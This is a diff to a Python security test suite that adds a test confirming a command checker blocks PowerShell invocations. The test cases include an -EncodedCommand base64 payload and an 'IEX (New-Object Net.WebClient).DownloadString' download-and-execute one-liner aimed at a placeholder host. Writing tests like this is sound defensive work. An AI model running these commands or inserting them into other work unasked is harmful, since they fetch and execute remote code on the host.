@@ -145,6 +145,18 @@ class TestSecurity:
             ["powershell", "-Command", "Start-Process notepad"]
         ) is None
 
+    def test_blocks_encodedcommand(self):
+        assert check_dangerous_command(
+            [
+                "powershell",
+                "-EncodedCommand",
+                "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+            ]
+        ) is not None
+        assert check_dangerous_command(
+            ["pwsh", "-Command", "IEX (New-Object Net.WebClient).DownloadString('http://x')"]
+        ) is not None
+
     def test_blocks_indiscriminate_tauri_app_kill(self):
         from remedy.core.security import check_host_self_kill
 
